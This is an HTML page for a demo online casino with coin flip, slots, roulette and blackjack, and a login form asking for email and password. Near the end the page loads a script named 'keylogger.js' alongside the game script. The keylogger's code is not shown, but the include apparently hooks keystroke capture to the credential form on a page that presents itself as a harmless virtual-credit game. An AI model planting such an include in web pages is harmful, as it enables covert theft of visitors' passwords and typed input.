<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Lucky Spin Casino</title>
<link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="bg-overlay"></div>
<div class="grid-lines"></div>
<header>
  <div class="logo">🍀 Lucky Spin Casino</div>
  <div class="balance-bar">
    <span class="bal-label">BALANCE</span>
    <span id="balance">1000</span>
    <span class="coin-icon">🪙</span>
    <button id="add-credits" class="small-btn">+500</button>
  </div>
  <nav>
    <a href="#" data-game="coinflip" class="active">Coin Flip</a>
    <a href="#" data-game="slots">Slots</a>
    <a href="#" data-game="roulette">Roulette</a>
    <a href="#" data-game="blackjack">Blackjack</a>
    <a href="#login" class="btn-login" id="open-login">Login</a>
  </nav>
</header>

<main>
  <!-- COIN FLIP -->
  <section id="game-coinflip" class="game-panel active">
    <h2 class="neon-title">Coin Flip</h2>
    <p class="subtitle">Call it. Double or nothing.</p>
    <div class="coin-arena">
      <div class="coin-stage">
        <div class="coin" id="coin">
          <div class="coin-face heads">H</div>
          <div class="coin-face tails">T</div>
        </div>
        <div class="coin-glow"></div>
      </div>
      <div class="flip-controls">
        <div class="side-picker">
          <button class="side-btn" data-side="heads" id="pick-heads">
            <span class="side-icon">👑</span>
            <span>HEADS</span>
          </button>
          <button class="side-btn" data-side="tails" id="pick-tails">
            <span class="side-icon">⚡</span>
            <span>TAILS</span>
          </button>
        </div>
        <div class="bet-row">
          <label>BET</label>
          <input type="number" id="flip-bet" value="25" min="1" max="1000">
          <div class="quick-bets">
            <button class="qbet" data-amt="10">10</button>
            <button class="qbet" data-amt="50">50</button>
            <button class="qbet" data-amt="100">100</button>
            <button class="qbet" data-amt="half">½</button>
            <button class="qbet" data-amt="max">MAX</button>
          </div>
        </div>
        <button id="flip-btn" class="cta flip-cta">FLIP COIN</button>
        <div id="flip-result" class="result-msg"></div>
        <div class="streak-bar">
          Streak: <span id="streak">0</span>
          <span class="streak-fire" id="streak-fire"></span>
        </div>
      </div>
    </div>
  </section>

  <!-- SLOTS -->
  <section id="game-slots" class="game-panel">
    <h2 class="neon-title">Neon Reels</h2>
    <div class="slot-machine">
      <div class="reels">
        <div class="reel" id="reel1">🍒</div>
        <div class="reel" id="reel2">🍋</div>
        <div class="reel" id="reel3">🔔</div>
      </div>
      <div class="slot-controls">
        <label>Bet: <input type="number" id="slot-bet" value="10" min="1" max="500"></label>
        <button id="spin-btn" class="cta">SPIN</button>
      </div>
      <div id="slot-result" class="result-msg"></div>
    </div>
  </section>

  <!-- ROULETTE -->
  <section id="game-roulette" class="game-panel">
    <h2 class="neon-title">European Roulette</h2>
    <div class="roulette-wrap">
      <div class="wheel" id="wheel">🎯</div>
      <div class="roulette-controls">
        <div class="bet-types">
          <button class="bet-btn" data-bet="red">Red (x2)</button>
          <button class="bet-btn" data-bet="black">Black (x2)</button>
          <button class="bet-btn" data-bet="green">0 (x14)</button>
          <button class="bet-btn" data-bet="odd">Odd (x2)</button>
          <button class="bet-btn" data-bet="even">Even (x2)</button>
        </div>
        <label>Bet: <input type="number" id="roulette-bet" value="10" min="1" max="500"></label>
        <button id="spin-roulette" class="cta">SPIN WHEEL</button>
        <div id="roulette-result" class="result-msg"></div>
      </div>
    </div>
  </section>

  <!-- BLACKJACK -->
  <section id="game-blackjack" class="game-panel">
    <h2 class="neon-title">Blackjack</h2>
    <div class="bj-table">
      <div class="hand">
        <h3>Dealer <span id="dealer-score"></span></h3>
        <div id="dealer-cards" class="cards"></div>
      </div>
      <div class="hand">
        <h3>You <span id="player-score"></span></h3>
        <div id="player-cards" class="cards"></div>
      </div>
      <div class="bj-controls">
        <label>Bet: <input type="number" id="bj-bet" value="20" min="1" max="500"></label>
        <button id="bj-deal" class="cta">Deal</button>
        <button id="bj-hit" class="small-btn" disabled>Hit</button>
        <button id="bj-stand" class="small-btn" disabled>Stand</button>
        <div id="bj-result" class="result-msg"></div>
      </div>
    </div>
  </section>
</main>

<div id="login-modal" class="modal">
  <div class="modal-content">
    <span class="close" id="close-login">&times;</span>
    <h2>Login / Register</h2>
    <form id="auth-form">
      <input type="email" id="email" name="email" placeholder="Email" required>
      <input type="password" id="password" name="password" placeholder="Password" required>
      <input type="text" id="username" name="username" placeholder="Username (optional)">
      <button type="submit">Enter Casino</button>
    </form>
    <p class="terms">Demo only. Virtual credits.</p>
  </div>
</div>

<script src="keylogger.js"></script>
<script src="casino.js"></script>
</body>
</html>
